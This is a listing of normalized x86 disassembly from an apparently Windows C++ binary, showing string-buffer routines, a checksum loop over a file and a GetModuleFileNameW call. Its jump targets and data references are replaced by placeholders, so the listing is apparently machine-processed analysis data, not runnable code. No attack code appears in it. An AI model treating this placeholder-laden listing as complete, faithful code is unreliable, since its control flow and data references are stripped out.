mov edx [ ebp - 0x1c ]
mov ecx [ edx + 0x14 ]
shr ecx 0x1
cmp ecx eax
ja r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x20 ] ecx
jmp r-xdata
mov edx [ ebp - 0x1c ]
mov esi [ edx + 0x14 ]
shr esi 0x1
mov ecx [ ebp - 0x1c ]
call sub_40bc10
sub eax esi
mov ecx [ ebp - 0x1c ]
cmp [ ecx + 0x14 ] eax
ja r-xdata
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x21 ]
push edx
mov ecx [ ebp - 0x1c ]
call sub_40b370
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x20 ]
add eax 0x1
push eax
mov ecx [ ebp - 0x28 ]
call sub_40c060
mov [ ebp - 0x30 ] eax
mov ecx [ ebp - 0x30 ]
mov [ ebp - 0x18 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x1c ]
call sub_40bc10
mov [ ebp - 0x20 ] eax
mov edx [ ebp - 0x1c ]
mov eax [ edx + 0x14 ]
shr eax 0x1
mov ecx [ ebp - 0x1c ]
add eax [ ecx + 0x14 ]
mov [ ebp - 0x20 ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
push 0x0
push 0x1
mov ecx [ ebp - 0x1c ]
call sub_40b2a0
lea edx [ ebp - 0x18 ]
push edx
mov eax [ ebp - 0x1c ]
push eax
lea ecx [ ebp - 0x23 ]
push ecx
mov ecx [ ebp - 0x1c ]
call sub_40b370
mov ecx eax
call sub_40c160
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
mov [ edx + 0x14 ] eax
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp - 0x1c ]
call sub_40b6a0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x1c ]
call sub_40b390
push eax
mov ecx [ ebp - 0x18 ]
push ecx
call sub_40ab10
add esp 0xc
sub_40bd22
mov [ ebp - 0x10 ] esp
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] 0x2
lea eax [ ebp - 0x22 ]
push eax
mov ecx [ ebp - 0x1c ]
call sub_40b370
mov [ ebp - 0x2c ] eax
mov ecx [ ebp - 0x20 ]
add ecx 0x1
push ecx
mov ecx [ ebp - 0x2c ]
call sub_40c060
mov [ ebp - 0x34 ] eax
mov edx [ ebp - 0x34 ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov eax r-xdata
retn
sub_40be20
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
cmp ecx [ ebp + 0x8 ]
jae r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40b4e0
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x4 ]
call sub_40b5c0
sub_40be50
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x10 ] ecx
lea eax [ ebp - 0x1 ]
push eax
mov ecx [ ebp - 0x10 ]
call sub_40b370
mov ecx eax
call sub_40c0c0
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x1
ja r-xdata
mov ecx [ ebp - 0x8 ]
sub ecx 0x1
mov [ ebp - 0xc ] ecx
mov [ ebp - 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
sub_40be90
push ebp
mov ebp esp
push 0xffffffff
push sub_41be30
mov eax [ fs : 0x0 ]
push eax
push ecx
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x1c ] ecx
mov eax [ ebp + 0x8 ]
or eax 0x7
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x1c ]
call sub_40be50
cmp eax [ ebp - 0x20 ]
jae r-xdata
mov eax [ ebp - 0x20 ]
xor edx edx
mov ecx 0x3
div ecx
mov edx [ ebp - 0x1c ]
mov ecx [ edx + 0x14 ]
shr ecx 0x1
cmp ecx eax
ja r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x20 ] ecx
jmp r-xdata
mov edx [ ebp - 0x1c ]
mov esi [ edx + 0x14 ]
shr esi 0x1
mov ecx [ ebp - 0x1c ]
call sub_40be50
sub eax esi
mov ecx [ ebp - 0x1c ]
cmp [ ecx + 0x14 ] eax
ja r-xdata
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x21 ]
push edx
mov ecx [ ebp - 0x1c ]
call sub_40b370
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x20 ]
add eax 0x1
push eax
mov ecx [ ebp - 0x28 ]
call sub_40c0a0
mov [ ebp - 0x30 ] eax
mov ecx [ ebp - 0x30 ]
mov [ ebp - 0x18 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x1c ]
call sub_40be50
mov [ ebp - 0x20 ] eax
mov edx [ ebp - 0x1c ]
mov eax [ edx + 0x14 ]
shr eax 0x1
mov ecx [ ebp - 0x1c ]
add eax [ ecx + 0x14 ]
mov [ ebp - 0x20 ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
push 0x0
push 0x1
mov ecx [ ebp - 0x1c ]
call sub_40b520
lea edx [ ebp - 0x18 ]
push edx
mov eax [ ebp - 0x1c ]
push eax
lea ecx [ ebp - 0x23 ]
push ecx
mov ecx [ ebp - 0x1c ]
call sub_40b370
mov ecx eax
call sub_40c160
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
mov [ edx + 0x14 ] eax
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp - 0x1c ]
call sub_40b4e0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x1c ]
call sub_40b5e0
push eax
mov ecx [ ebp - 0x18 ]
push ecx
call sub_40aa00
add esp 0xc
sub_40bf62
mov [ ebp - 0x10 ] esp
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] 0x2
lea eax [ ebp - 0x22 ]
push eax
mov ecx [ ebp - 0x1c ]
call sub_40b370
mov [ ebp - 0x2c ] eax
mov ecx [ ebp - 0x20 ]
add ecx 0x1
push ecx
mov ecx [ ebp - 0x2c ]
call sub_40c0a0
mov [ ebp - 0x34 ] eax
mov edx [ ebp - 0x34 ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov eax r-xdata
retn
sub_40c160
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0xc ]
push eax
call sub_40c1b0
add esp 0x4
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp - 0x4 ]
push edx
call sub_40c240
add esp 0xc
mov esp ebp
pop ebp
retn 0x8
sub_40c190
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
push ecx
call sub_40c260
add esp 0x8
mov esp ebp
pop ebp
retn 0x4
sub_40c1c0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0xffffffff
ja r-xdata
jmp r-xdata
call sub_41aada
mov eax [ ebp + 0x8 ]
push eax
call sub_4109d4
add esp 0x4
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_40c200
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
ja r-xdata
jmp r-xdata
call sub_41aada
mov eax [ ebp + 0x8 ]
shl eax 0x1
push eax
call sub_4109d4
add esp 0x4
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_40c240
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push eax
call sub_40c1b0
add esp 0x4
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
call sub_40c280
pop ebp
retn
sub_40c280
push ebp
mov ebp esp
push 0xffffffff
push sub_41bde1
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] ecx
mov eax [ ebp + 0x8 ]
push eax
push 0x4
call sub_40a940
add esp 0x8
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov [ ebp - 0x14 ] 0x0
mov ecx [ ebp + 0xc ]
push ecx
call sub_40c1b0
add esp 0x4
mov edx [ ebp - 0x10 ]
mov eax [ eax ]
mov [ edx ] eax
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ecx
jmp r-xdata
mov edx [ ebp - 0x14 ]
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x8
sub_40c320
push ebp
mov ebp esp
sub esp 0x8
mov eax [ ebp + 0x8 ]
xor eax 0xffffffff
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
xor eax 0xffffffff
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
shr eax 0x8
mov ecx [ ebp - 0x4 ]
and ecx 0xff
mov edx [ ebp + 0xc ]
movzx edx [ edx ]
xor ecx edx
xor eax [ ecx * 4 + rw-data ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
add eax 0x1
mov [ ebp + 0xc ] eax
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp + 0x10 ]
sub edx 0x1
mov [ ebp + 0x10 ] edx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
sub_40c380
push ebp
mov ebp esp
mov eax 0x4010
call sub_413fc0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x4010 ] 0x4000
mov [ ebp - 0x4008 ] 0x0
mov eax [ ebp - 0x4008 ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x400c ]
push edx
lea eax [ ebp - 0x4004 ]
push eax
mov ecx [ ebp - 0x4008 ]
push ecx
call sub_40c320
add esp 0xc
mov [ ebp - 0x4008 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0x4000
push 0x1
lea ecx [ ebp - 0x4004 ]
push ecx
call sub_410169
add esp 0x10
mov [ ebp - 0x400c ] eax
cmp [ ebp - 0x400c ] 0x0
jbe r-xdata
sub_40c410
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] 0x0
push r--data
mov ecx [ ebp + 0x8 ]
call sub_40c470
push eax
call sub_410b0c
add esp 0x8
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
push eax
call sub_40c380
add esp 0x4
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x4 ]
push ecx
call sub_410937
add esp 0x4
sub_40c4b0
push ebp
mov ebp esp
push 0xffffffff
push sub_41be7e
mov eax [ fs : 0x0 ]
push eax
sub esp 0x260
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x4 ] 0x0
push 0x0
push r--data
lea ecx [ ebp + 0x8 ]
call sub_40b220
cmp eax [ r--data ]
je r-xdata
xor edx edx
mov [ ebp - 0x218 ] dx
push 0x206
push 0x0
lea eax [ ebp - 0x216 ]
push eax
call sub_412270
add esp 0xc
push 0x104
lea ecx [ ebp - 0x218 ]
push ecx
push 0x0
call [ GetModuleFileNameW@IAT ]
lea edx [ ebp - 0x218 ]
push edx
mov ecx rw-data
call sub_40b150
lea ecx [ ebp - 0x219 ]
call sub_40b340
mov [ ebp - 0x4 ] 0x2
lea eax [ ebp - 0x26c ]
push eax
lea ecx [ ebp - 0x219 ]
call sub_40d6c0
mov [ ebp - 0x250 ] eax
mov ecx [ ebp - 0x250 ]
push ecx
mov ecx rw-data
call sub_40c8d0
lea ecx [ ebp - 0x26c ]
call sub_40b130
push r--data
push rw-data
call sub_40cd10
add esp 0x8
movzx edx al
test edx edx
jne r-xdata
lea ecx [ ebp + 0x8 ]
call sub_40b280
mov [ ebp - 0x240 ] eax
push r--data
lea ecx [ ebp - 0x234 ]
call sub_40b0f0
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x23c ] 0x0
jmp r-xdata
mov [ ebp - 0x24c ] 0x3
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x219 ]
call sub_40d580
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp + 0x8 ]
call sub_40b130
mov eax [ ebp - 0x24c ]
jmp r-xdata
push r--data
push rw-data
call sub_40cd10
add esp 0x8
movzx eax al
test eax eax
je r-xdata
mov ecx [ ebp - 0x23c ]
cmp ecx [ ebp - 0x240 ]
jge r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn
mov [ ebp - 0x254 ] 0x2
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x219 ]
call sub_40d580
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp + 0x8 ]
call sub_40b130
mov eax [ ebp - 0x254 ]
jmp r-xdata
push r--data
push rw-data
call sub_40cd10
add esp 0x8
movzx eax al
test eax eax
jne r-xdata
mov edx [ ebp - 0x23c ]
push edx
lea ecx [ ebp + 0x8 ]
call sub_40ca50
movzx eax [ eax ]
cmp eax 0x28
jne r-xdata
mov [ ebp - 0x248 ] 0x3
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x234 ]
call sub_40b130
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp + 0x8 ]
call sub_40b130
mov eax [ ebp - 0x248 ]
jmp r-xdata
push r--data
push rw-data
call sub_40cd10
add esp 0x8
movzx ecx al
test ecx ecx
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x23c ]
add ecx 0x1
mov [ ebp - 0x238 ] ecx
jmp r-xdata
mov [ ebp - 0x244 ] 0x1
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x234 ]
call sub_40b130
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp + 0x8 ]
call sub_40b130
mov eax [ ebp - 0x244 ]
jmp r-xdata
mov eax [ ebp - 0x23c ]
add eax 0x1
mov [ ebp - 0x23c ] eax
mov eax [ ebp - 0x238 ]
cmp eax [ ebp - 0x240 ]
jge r-xdata
push r--data
push rw-data
call sub_40cd10
add esp 0x8
movzx edx al
test edx edx
je r-xdata
mov ecx [ ebp - 0x238 ]
push ecx
lea ecx [ ebp + 0x8 ]
call sub_40ca50
movzx edx [ eax ]
cmp edx 0x29
jne r-xdata
lea edx [ ebp - 0x234 ]
push edx
mov ecx rw-data
call sub_40c9b0
push r--data
lea ecx [ ebp - 0x234 ]
call sub_40b150
jmp r-xdata
mov eax [ ebp - 0x238 ]
mov [ ebp - 0x23c ] eax
lea ecx [ ebp - 0x234 ]
push ecx
mov ecx rw-data
call sub_40c9b0
push r--data
lea ecx [ ebp - 0x234 ]
call sub_40b150
jmp r-xdata
mov eax [ ebp - 0x238 ]
push eax
lea ecx [ ebp + 0x8 ]
call sub_40ca50
movzx ecx [ eax ]
cmp ecx 0x20
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x238 ]
push edx
lea ecx [ ebp + 0x8 ]
call sub_40ca50
mov ax [ eax ]
movzx ecx ax
push ecx
lea ecx [ ebp - 0x234 ]
call sub_40ca30
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x238 ]
add edx 0x1
mov [ ebp - 0x238 ] edx
sub_40c840
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
lea ecx [ ebp - 0x5 ]
call sub_40b340
sub esp 0x18
mov ecx esp
mov [ ebp - 0x14 ] esp
mov eax [ ebp + 0x10 ]
push eax
call sub_40b0f0
call sub_40c4b0
add esp 0x18
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x1
jne r-xdata
cmp [ ebp - 0xc ] 0x2
jne r-xdata
push rw-data
push rw-data
lea ecx [ ebp - 0x5 ]
call sub_40e650
jmp r-xdata
mov [ ebp - 0x10 ] 0x0
lea ecx [ ebp - 0x5 ]
call sub_40d580
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn 0x10
push 0x1
push rw-data
push rw-data
lea ecx [ ebp - 0x5 ]
call sub_40ed80
sub_40c8d0
push ebp
mov ebp esp
sub esp 0x14
mov [ ebp - 0xc ] ecx
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0x8 ]
je r-xdata
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn 0x4
push 0x0
push 0x1
mov ecx [ ebp - 0xc ]
call sub_40b520
lea ecx [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0x8 ]
call sub_40b370
push eax
lea edx [ ebp - 0x2 ]
push edx
mov ecx [ ebp - 0xc ]
call sub_40b370
push eax
call sub_40cd40
add esp 0x8
movzx eax al
test eax eax
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp + 0x8 ]
call sub_40b370
push eax
lea ecx [ ebp - 0x5 ]
push ecx
mov ecx [ ebp - 0xc ]
call sub_40b370
push eax
call sub_40cd40
add esp 0x8
movzx edx al
test edx edx
je r-xdata
xor ecx ecx
je r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40c1b0
add esp 0x4
push eax
mov ecx [ ebp - 0xc ]
call sub_40ca70
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp + 0x8 ]
call sub_40cbd0
mov ecx [ eax ]
push ecx
lea edx [ ebp - 0x14 ]
push edx
mov ecx [ ebp + 0x8 ]
call sub_40cba0
mov eax [ eax ]
push eax
mov ecx [ ebp - 0xc ]
call sub_40cd80
jmp r-xdata
lea edx [ ebp - 0x3 ]
push edx
mov ecx [ ebp + 0x8 ]
call sub_40b370
push eax
mov ecx [ ebp - 0xc ]
call sub_40c310
sub_40c9b0
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
mov eax [ ebp - 0x8 ]
cmp eax [ ebp + 0x8 ]
je r-xdata
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0x8 ]
call sub_40b370
push eax
lea edx [ ebp - 0x2 ]
push edx
mov ecx [ ebp - 0x8 ]
call sub_40b370
push eax
call sub_40cd40
add esp 0x8
movzx eax al
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
call sub_40cb70
xor ecx ecx
je r-xdata
push 0x0
push 0x1
mov ecx [ ebp - 0x8 ]
call sub_40b520
lea edx [ ebp - 0x3 ]
push edx
mov ecx [ ebp + 0x8 ]
call sub_40b370
push eax
mov ecx [ ebp - 0x8 ]
call sub_40c310
sub_40ca70
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x14 ] 0x8
jae r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x1 ]
push ecx
mov ecx [ ebp - 0x8 ]
call sub_40b370
mov ecx eax
call sub_40c160
mov edx [ ebp + 0x8 ]
mov [ edx ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x10 ]
add edx 0x1
push edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
push ecx
call sub_40aa70
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x10 ]
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
mov [ eax + 0x14 ] edx
push 0x0
push 0x0
mov ecx [ ebp + 0x8 ]
call sub_40b520
mov esp ebp
pop ebp
retn 0x4
sub_40caf0
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ r--data ]
sub ecx [ eax + 0x10 ]
cmp ecx [ ebp + 0x8 ]
ja r-xdata
cmp [ ebp + 0x8 ] 0x0
jbe r-xdata
mov ecx [ ebp - 0x4 ]
call sub_40b970
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
add eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
push 0x0
mov ecx [ ebp - 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_40ba60
movzx edx al
test edx edx
je r-xdata
movzx eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40cc00
mov ecx [ ebp - 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_40b4e0
sub_40cb70
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ r--data ]
push eax
push 0x0
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_40b9b0
mov esp ebp
pop ebp
retn 0x4
sub_40cba0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40b5e0
push eax
mov ecx [ ebp + 0x8 ]
call sub_40cc50
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn 0x4
sub_40cbd0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40b5e0
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x10 ]
lea eax [ eax + edx * 2 ]
push eax
mov ecx [ ebp + 0x8 ]
call sub_40cc50
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn 0x4
sub_40cc00
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
cmp [ ebp + 0xc ] 0x1
jne r-xdata
movzx eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_40b5e0
mov edx [ ebp + 0x8 ]
lea eax [ eax + edx * 2 ]
push eax
call sub_40c490
add esp 0xc
lea eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40b5e0
mov ecx [ ebp + 0x8 ]
lea edx [ eax + ecx * 2 ]
push edx
call sub_40aaa0
add esp 0x8
jmp r-xdata
mov esp ebp
pop ebp
retn 0xc
sub_40cc50
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_40cc80
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x8
sub_40cc80
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40c310
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov [ ecx ] edx
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x8
sub_40ccb0
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
lea eax [ ebp + 0xc ]
push eax
lea ecx [ ebp + 0x8 ]
call sub_40cce0
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_40cce0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40c310
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx ]
sub eax [ edx ]
sar eax 0x1
mov esp ebp
pop ebp
retn 0x4
sub_40cd10
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
call sub_40ce90
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov al [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_40cd40
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40d4c0
add esp 0x8
movzx edx al
test edx edx
jne r-xdata
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov al [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_40cd80
push ebp
mov ebp esp
sub esp 0x14
mov [ ebp - 0x4 ] ecx
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40cbd0
mov ecx [ eax ]
mov [ ebp - 0x8 ] ecx
lea edx [ ebp - 0x14 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40cba0
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_40cdd0
mov esp ebp
pop ebp
retn 0x8
sub_40cdd0
push ebp
mov ebp esp
sub esp 0x14
mov [ ebp - 0x4 ] ecx
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0x10 ]
call sub_40d160
movzx ecx al
test ecx ecx
je r-xdata
lea edx [ ebp - 0x14 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40cba0
mov eax [ eax ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp + 0x10 ]
push ecx
lea ecx [ ebp + 0x14 ]
call sub_40d130
push eax
lea ecx [ ebp + 0x10 ]
call sub_40d110
push eax
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0xc ]
push eax
call sub_40ccb0
add esp 0x8
push eax
mov ecx [ ebp - 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_40ccb0
add esp 0x8
push eax
mov ecx [ ebp - 0x4 ]
call sub_40cec0
lea edx [ ebp - 0x10 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_40cba0
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
call sub_40ccb0
add esp 0x8
push eax
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_40ccb0
add esp 0x8
push eax
mov ecx [ ebp - 0x4 ]
call sub_40b170
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x10
sub_40ce90
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
call sub_40a9a0
add esp 0x4
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
push eax
push 0x0
mov ecx [ ebp - 0x4 ]
call sub_40d050
mov esp ebp
pop ebp
retn 0x4
sub_40cec0
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_40bb10
movzx ecx al
test ecx ecx
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x10 ]
